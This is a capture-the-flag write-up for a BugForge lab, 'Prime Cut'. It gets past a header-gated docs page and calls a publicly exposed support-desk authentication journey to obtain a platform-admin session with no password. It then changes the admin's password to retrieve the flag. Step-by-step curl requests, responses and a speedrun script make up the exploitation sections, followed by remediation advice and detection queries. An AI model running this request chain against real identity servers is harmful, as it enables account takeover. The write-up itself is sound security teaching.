---
title: Prime Cut - Auth Bypass
tags:
  - bugforge
  - authorization-bypass
  - authentication-bypass
  - privilege-escalation
  - broken-access-control
  - api-enumeration
  - caido-mcp
aliases:
  - "/bugforge/prime-cut-auth-bypass/"
  - "/BugForge/Prime-Cut---Auth-Bypass"
---

- Prime Cut is a members-only steak club (React SPA plus an Express API) whose sign-in is handled by Vantage Access Manager mounted at `/am`
- That AM instance publishes its own administrator documentation behind a header check anyone can satisfy, and the documentation lists its authentication journeys: one of them is a support-desk journey that mints a full session with no credential at all
- A couple of enumeration requests at `/am` produced a live `platform-admin` session for `d.calloway`, and the flag came back in the `resetReference` field of an admin password change
- Key lesson: the weakest link was not a broken check in the app's own code. It was an administrative authentication journey that was only ever supposed to be reachable from the company network, plus a docs page whose gate was a client-supplied header

Requests in this writeup were sent through Caido; they are shown as `curl` for reproducibility.


### 1. The app surface

```bash
TARGET="https://lab-1789409512339-mfflsk.labs-app.bugforge.io"
```

- React SPA (MUI) plus Express API, `X-Powered-By: Express` on every response
- Exactly four API routes: `GET /api/cuts`, `GET /api/me`, `GET|POST /api/orders`, `GET /api/team`
- Auth is entirely delegated to AM: the SPA calls `/am/json/realms/root/realms/members/authenticate` and stores the returned `tokenId` in `localStorage` as `pc_session`

### 2. Asking the auth server about itself

AM exposes a server info resource. It needs no session at all:

```bash
curl -sk "$TARGET/am/json/serverinfo/*"
```

```json
{"_id":"*","cookieName":"vantageSession","secureCookie":false,"realm":"/members",
 "forgotPassword":"true","selfRegistration":"true","docsUrl":"/am/docs/",
 "consoleHeader":"X-Vantage-Console","FQDN":"lab-1789409512339-mfflsk.labs-app.bugforge.io"}
```

Read it as a to-do list:

- `docsUrl` - there is an administrator documentation site at `/am/docs/`
- `consoleHeader` - the documentation is gated by a header named `X-Vantage-Console`
- `cookieName` - the session token is called `vantageSession`
- `realm` - everything sits in `/members`

Nothing here is a vulnerability by itself, but it is published to anonymous callers, and it tells you the name of the very header the next step needs.

### 3. A gate that is not a gate

```bash
curl -sk "$TARGET/am/docs/"
```

```
HTTP/1.1 403 Forbidden

{"code":403,"reason":"Forbidden","message":"Administrator documentation is served to the
 administration console only. The required console header was not present on this request."}
```

That message is unusually helpful: it names the control it is enforcing. The header came from `serverinfo`, so set it:

```bash
curl -sk "$TARGET/am/docs/" -H 'X-Vantage-Console: true'
```

```
HTTP/1.1 200 OK
```

- The header value is never validated. `true` works, `1` works, and so does any other string, because the check only asks whether the header is present.
- No session is required. The gate is not "are you an administrator", it is "did you send this string".
- The header name was disclosed by an unauthenticated endpoint, so the gate is self-defeating.

### 4. The documentation advertises the bug

The docs index links two pages, `rest-authentication.html` and `identity-management.html`. The first one contains this, almost word for word:

```
Support-desk journeys terminate in a full member session without collecting a credential.
They must never be reachable from an untrusted network. Restrict them at the reverse proxy
by rejecting requests that carry authIndexValue for a support journey on the public listener.
Vantage AM does not enforce this at the realm level.
```

"Vantage AM does not enforce this at the realm level" means the only thing standing between the internet and a passwordless admin session is a reverse proxy rule. That rule is frequently missing, because it lives in someone else's config file.

The same page also documents how to enumerate the journeys and confirms the selector syntax:

| Parameter | Meaning |
|-----------|---------|
| `authIndexType` | Selector kind. `service` selects a configured journey by name. |
| `authIndexValue` | The journey name, exactly as configured. |

### 5. Listing the journeys

This one needs a session, so register a throwaway member first. Registration is a self-service journey that returns a `tokenId` directly:

```bash
curl -sk -X POST "$TARGET/am/json/realms/root/realms/members/selfservice/registration" \
  -H 'Content-Type: application/json' \
  -d '{"username":"atk_mfflsk","email":"atk@mfflsk.test","password":"Pass1234!"}'
```

Then read the tree list:

```bash
curl -sk "$TARGET/am/json/realms/root/realms/members/authentication/authtrees?_queryFilter=true" \
  -H "vantageSession: $MEMBER_TOKEN"
```

```json
{"result":[
  {"_id":"Login","description":"Member sign-in journey","enabled":true},
  {"_id":"Registration","description":"Self-registration for new club members","enabled":true},
  {"_id":"ResetPassword","description":"Member-initiated password reset with emailed passcode","enabled":true},
  {"_id":"unlockUser","description":"Support-desk account unlock","enabled":true},
  {"_id":"forgottenUsername","description":"Support-desk username lookup","enabled":true}],
 "resultCount":5}
```

Two of those descriptions say "Support-desk". Per the docs, those complete without collecting a credential. `unlockUser` is the one worth trying: it is an account unlock tool, so it identifies a subject and finishes.

### Telling real endpoints from the SPA catch-all

This is the skill that kept the earlier passes from wasting requests. The Express app serves `index.html` for unknown GET paths, so "200 OK" means nothing by itself:

| Probe | Unknown path looks like | Real route looks like |
|-------|------------------------|----------------------|
| GET | 859 bytes of `text/html` containing `<div id="root">` | JSON, or an explicit error like `{"code":403,...}` |
| POST | Express 404 page: `Cannot POST /api/whatever` plus a `Content-Security-Policy` header | JSON, or a route-specific error |

The POST form is the more useful oracle: for a GET it is genuinely hard to distinguish "route does not exist" from "route exists but renders the SPA", while an Express `Cannot POST` 404 is definitive.

## The vulnerability

Two defects combine, and the flag is a symptom of the second.

| Test | Input | Result | Meaning |
|------|-------|--------|---------|
| Start `unlockUser` | empty body | `200` with a single `NameCallback`, header "Support-desk account unlock" | The journey asks who to unlock and nothing else |
| Answer with `d.calloway` | `IDToken1=d.calloway` | `200` with `tokenId` | A full session was issued with no credential |
| Answer with `flag` | `IDToken1=flag` | `401 "Authentication Failed"` | Unknown user - a user-enumeration oracle |
| `GET /api/me` with that token | - | `role: platform-admin` | The session is the platform administrator |
| `GET /am/.../sessions` with that token | - | `authenticatedBy: unlockUser` | Which journey minted the session is visible |
| `changePassword` on the admin record | new password only | `200` with `resetReference` | No current password required, and the reference carried the flag |

**Defect 1 - passwordless session issuance (critical).** The support-desk journey `unlockUser` is reachable on the public listener. It takes a username, collects no credential, and terminates in a full session for that identity. Anything a support desk can do, the internet can do.

**Defect 2 - credential change without the current credential (high).** `?_action=changePassword` on an identity accepts only the new `userPassword`. The docs are explicit that this is deliberate: "The current credential is not required. The session is treated as sufficient proof of control." That is defensible when the session came from a real sign-in. It is not defensible when the session was minted by Defect 1.

Why it is vulnerable: authorization was enforced by deployment topology (a proxy rule) rather than by the application. Any control that lives only in a network diagram is one misconfigured listener away from being absent.

## Exploitation

Six requests from an unauthenticated position to a platform-admin session and the flag.

### Step 1 - Ask the auth server to describe itself

```bash
curl -sk "$TARGET/am/json/serverinfo/*"
```

Response: `200` with `docsUrl: /am/docs/` and `consoleHeader: X-Vantage-Console`.

### Step 2 - Satisfy the documentation gate

```bash
curl -sk "$TARGET/am/docs/" -H 'X-Vantage-Console: anything'
```

Response: `200`. Read `rest-authentication.html` for the journey list and the support-desk warning.

### Step 3 - Enumerate the journeys

```bash
curl -sk "$TARGET/am/json/realms/root/realms/members/authentication/authtrees?_queryFilter=true" \
  -H "vantageSession: $MEMBER_TOKEN"
```

Response: `200` with `Login`, `Registration`, `ResetPassword`, `unlockUser`, `forgottenUsername`.

### Step 4 - Start the support-desk journey

```bash
curl -sk -X POST "$TARGET/am/json/realms/root/realms/members/authenticate?authIndexType=service&authIndexValue=unlockUser" \
  -H 'Content-Type: application/json' -d '{}'
```

```json
{"authId":"5213cd9dff9636ad114066d96ecfedb1208997c2",
 "callbacks":[{"type":"NameCallback","output":[{"name":"prompt","value":"User Name"}],
               "input":[{"name":"IDToken1","value":""}]}],
 "header":"Support-desk account unlock"}
```

Compare this with the default journey, which asks for a `NameCallback` **and** a `PasswordCallback`. Here there is nothing to answer except the name.

### Step 5 - Answer it, and collect the session

Echo the whole document back with the input populated. The `authId` is single use, so if you wait too long or reuse it, you will get "Authentication session has expired" and need a fresh one.

```bash
curl -sk -X POST "$TARGET/am/json/realms/root/realms/members/authenticate?authIndexType=service&authIndexValue=unlockUser" \
  -H 'Content-Type: application/json' \
  -d '{"authId":"5213cd9dff9636ad114066d96ecfedb1208997c2",
       "callbacks":[{"type":"NameCallback","output":[{"name":"prompt","value":"User Name"}],
                     "input":[{"name":"IDToken1","value":"d.calloway"}]}]}'
```

```json
{"tokenId":"AQIC5wM2LY4Sfcw...*AAJTSQACMDE.*","successUrl":"/dashboard","realm":"/members"}
```

That is a platform administrator's session. No password, no MFA, no email, nothing.

### Step 6 - Confirm what you actually hold

```bash
curl -sk "$TARGET/api/me" -H "vantageSession: $TOKEN"
```

```json
{"uuid":"b7e40a25-1f68-4c93-bd52-90ac3e17d6b4","username":"d.calloway",
 "email":"d.calloway@primecut.example","full_name":"Dana Calloway",
 "job_title":"Platform Administrator","role":"platform-admin","member_since":"2023-06-02"}
```

```bash
curl -sk "$TARGET/am/json/realms/root/realms/members/sessions" -H "vantageSession: $TOKEN"
```

```json
{"username":"d.calloway","universalId":"id=d.calloway,ou=user,/members",
 "realm":"/members","authenticatedBy":"unlockUser","maxIdleExpirationTime":"..."}
```

`authenticatedBy` is the receipt. Anyone reviewing the audit trail can see this session was not a sign-in.

### Step 7 - Change the admin password, and take the flag

```bash
curl -sk -X POST "$TARGET/am/json/realms/root/realms/members/users/b7e40a25-1f68-4c93-bd52-90ac3e17d6b4?_action=changePassword" \
  -H "vantageSession: $TOKEN" -H 'Content-Type: application/json' \
  -d '{"userPassword":"Pw1234!abc"}'
```

```json
{"_id":"b7e40a25-1f68-4c93-bd52-90ac3e17d6b4","username":"d.calloway",
 "message":"Password updated successfully",
 "resetReference":"bug{2TeBD9IapLLEAHYht79s7BgNQ7Azpfw4}"}
```

The flag is not behind a dedicated endpoint. It is sitting in the `resetReference` of an ordinary success response, which is worth remembering: always read the whole response body, including the fields you were not looking for.

## Flag

```
bug{2TeBD9IapLLEAHYht79s7BgNQ7Azpfw4}
```

## TL;DR - speedrun

```bash
TARGET="https://lab-1789409512339-mfflsk.labs-app.bugforge.io"
ADMIN_UUID="b7e40a25-1f68-4c93-bd52-90ac3e17d6b4"
JOURNEY="$TARGET/am/json/realms/root/realms/members/authenticate?authIndexType=service&authIndexValue=unlockUser"

# 1. Unauthenticated config: docsUrl + consoleHeader
curl -sk "$TARGET/am/json/serverinfo/*"

# 2. Read the admin docs (header value is not checked)
curl -sk "$TARGET/am/docs/rest-authentication.html" -H 'X-Vantage-Console: 1'

# 3. Start the support-desk journey and answer it with the admin username
curl -sk -X POST "$JOURNEY" -H 'Content-Type: application/json' -d '{}'
curl -sk -X POST "$JOURNEY" -H 'Content-Type: application/json' \
  -d '{"authId":"<from previous response>","callbacks":[{"type":"NameCallback",
       "output":[{"name":"prompt","value":"User Name"}],
       "input":[{"name":"IDToken1","value":"d.calloway"}]}]}'

# 4. Spend the session: change the admin password, read resetReference
curl -sk -X POST "$TARGET/am/json/realms/root/realms/members/users/$ADMIN_UUID?_action=changePassword" \
  -H "vantageSession: <tokenId>" -H 'Content-Type: application/json' \
  -d '{"userPassword":"Pw1234!abc"}'
```

## Dead ends worth knowing about

Negative results are part of the map. These were all tried and all failed, so you can skip them next time.

- **The app API has no hidden admin routes.** Forty one POST probes across `flag`, `flags`, `admin`, `console`, `vault`, `keys`, `secrets`, `users`, `audit`, `export`, `impersonate`, `elevate`, `promote`, `support` and friends all returned Express `Cannot POST` 404. Four routes exist. There is no fifth.
- **Being platform-admin does not widen the identity resource.** `/am/.../users/:uuid` is strictly owner-only. An admin session reading `r.okonkwo` or `m.silva` gets `403 Access denied`, exactly like a member. Privilege is not the same as scope.
- **The identity route is not a username oracle.** A non-UUID value returns `403`, not `404`, so it tells you nothing about which usernames exist.
- **Collection and sub-resources do not exist.** `/am/.../users` (GET catch-all, POST 404), `/users/:uuid/{roles,groups,privileges,sessions,tokens,password}` (catch-all), `sessions?_action=getSessionInfo` (404).
- **Only `service` selects a journey.** `authIndexType` of `tree`, `user`, `role` or `resource` all silently fall back to the default `Login` journey.
- **Unlisted journey names are rejected cleanly.** `ForgotPassword`, `Admin`, `AdminLogin` and similar return `401 "Configuration for the authentication tree '<name>' was not found in realm /members"`. The tree list above is the complete list.
- **The flag is not in the frontend.** `bug{` does not appear in the 466 KB `main.fb787961.js` or its source map, and there is no admin branch in any component.
- **The identity schema is fixed.** `_id, username, mail, givenName, sn, title, privilege, accountStatus, memberSince`. No user record carries the flag, including the staff accounts and the hidden member `b33f`.

## Two smaller findings from the same session

- **User enumeration via `unlockUser` (medium).** The journey answers `401 "Authentication Failed"` for a username that does not exist and `200` with a `tokenId` for one that does. That is a clean oracle for "does this account exist", one request per guess, no side effects. The self-service `Registration` tree leaks the same thing with `"Username or email already registered"`.
- **A real seeded identity is used as the docs example (low).** `identity-management.html` uses `b33f` / "Big Beef" / uuid `4f1c2b90-8d3a-4e57-9c11-6a0be2d74f83` as its sample record. That is a live account, it is not listed by `GET /api/team`, and its orders (ids 1 to 4) are real data. Documentation examples copied from production data are a quiet source of leaks.

## Why it worked

1. **The auth server was treated as its own target.** The earlier passes on this lab tested the app's API thoroughly and the AM paths partially, but stopped before `serverinfo` and the docs. The app was the visible part; the auth server was the part with the interesting configuration.
2. **The product documented its own control gap.** "Must never be reachable from an untrusted network" plus "Vantage AM does not enforce this at the realm level" is a design admission. Vendor documentation is a legitimate and often underused reconnaissance source.
3. **Administrative journeys are not user journeys.** A journey built for a support desk is designed to skip credential collection on purpose. Exposing it to the internet does not bypass an authentication check, it removes the need for one.
4. **Error differentials became oracles.** Two different responses for two inputs is never just an error message.
5. **The flag was in a field nobody looks at.** `resetReference` is presented as a support ticket reference. It was the answer.

## Security takeaways

### Vulnerability

- Passwordless session issuance through a publicly reachable support-desk authentication journey, escalating any unauthenticated attacker to `platform-admin`
- Paired with an unverified password change (no current credential required) and a documentation gate enforced by a client-supplied header
- OWASP Top 10: A01:2021 Broken Access Control, A07:2021 Identification and Authentication Failures, A05:2021 Security Misconfiguration
- CWE-306 Missing Authentication for Critical Function, CWE-290 Authentication Bypass by Spoofing, CWE-620 Unverified Password Change, CWE-204 Observable Response Discrepancy, CWE-200 Exposure of Sensitive Information to an Unauthorized Actor

### Root Cause

- The security boundary for support-desk journeys was assumed to be the network perimeter. The product does not enforce it at the realm level, and the deployment requirement in the vendor documentation was not implemented at the reverse proxy.
- The documentation gate trusted a header whose name and value are both attacker-controlled, and disclosed the header name from an unauthenticated endpoint.
- An identity's credential could be replaced using only possession of a session, so any session-minting weakness became immediate account takeover.
- A sensitive value was returned in a routine support field, with no separation between operational metadata and secrets.

### Remediation

- Reject requests carrying `authIndexValue` that resolves to a support-desk journey on the public listener. Enforce it at the edge as the vendor requires, and add a regression test that asserts the rejection, because a proxy rule with no test is a proxy rule that will be removed during a migration.
- Better: do not expose support-desk journeys on the public realm at all. Put them in a separate realm that is not internet-routable.
- Treat the console header as a credential, not a constant: have the console obtain a short-lived, server-signed token, and validate it. Never disclose the header name from an unauthenticated endpoint.
- Require current-password confirmation or a step-up challenge for credential changes, and require step-up when the session was created by a non-interactive journey such as an unlock.
- Return an opaque, non-reversible reference from `changePassword`. Never place sensitive values in operational metadata.
- Make the "user does not exist" and "authentication failed" responses identical, and rate limit the authentication endpoint per source and per identifier.
- Restrict `/am/json/serverinfo/*` to what a client genuinely needs before authentication.

### Detection

Two log sources give this away. Both should be paired with an alert, because the attack is three requests long.

```spl
### D1: support-desk journey invoked from a public client
index=web sourcetype=nginx:access
uri_path="/am/json/realms/root/realms/members/authenticate*"
uri_query="*authIndexValue=unlockUser*" OR uri_query="*authIndexValue=forgottenUsername*"
| stats count by src_ip, uri_query, status
| where count >= 1
```

```spl
### D2: credential changes with no interactive sign-in behind them
index=am sourcetype=am:authentication
| eval is_change = if(action="changePassword", 1, 0)
| eval is_login  = if(action="authenticate" AND authenticatedBy="Login", 1, 0)
| stats sum(is_change) as changes, sum(is_login) as logins by actor_username, src_ip
| where changes > 0 AND logins = 0
```

Field and sourcetype names above are illustrative; map them to whatever your AM audit trail actually emits. The point is the shape of the query: a credential change should be attributable to a real sign-in. `authenticatedBy` is the highest value field in the AM audit trail for this class of bug, because a `changePassword` attributed to `unlockUser` is not normal traffic. The same field also lets you alert directly on any session where `authenticatedBy` is a support-desk journey, which is the cleaner rule if your logs carry it on the session record.

### Key Lesson

Enumerate the authentication server, not just the application. `/am`, `/auth`, `/sso`, `/oauth` and friends are separate products with their own routes, their own documentation, and their own journeys, and they frequently carry the administrative paths that the app itself does not expose. Read that product's documentation, because it will tell you both how to enumerate its journeys and which ones were never meant to be public. Then always read the entire response body, since the flag here was in a field called `resetReference`.
